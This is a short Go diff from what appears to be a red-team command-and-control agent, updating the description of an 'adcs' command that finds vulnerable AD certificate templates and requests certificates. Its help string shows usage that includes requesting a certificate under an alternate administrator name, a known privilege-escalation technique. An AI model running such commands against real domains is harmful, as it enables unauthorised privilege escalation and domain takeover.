@@ -10,7 +10,7 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "adcs",
-		Description:         "Enumerate AD Certificate Services (ADCS), find vulnerable templates (ESC1-ESC4), and request certificates via DCOM.",
+		Description:         "Enumerate AD Certificate Services (ADCS), find vulnerable templates (ESC1-ESC4, ESC6 via DCOM), and request certificates via DCOM.",
 		HelpString:          "adcs -action find -server 192.168.1.1 -username user@domain.local -password pass\nadcs -action cas -server dc01\nadcs -action templates -server dc01\nadcs -action request -server ca01 -ca_name CA-NAME -template User -username DOMAIN\\user -password pass [-alt_name admin@domain.local]",
 		Version:             1,
 		Author:              "@galoryber",
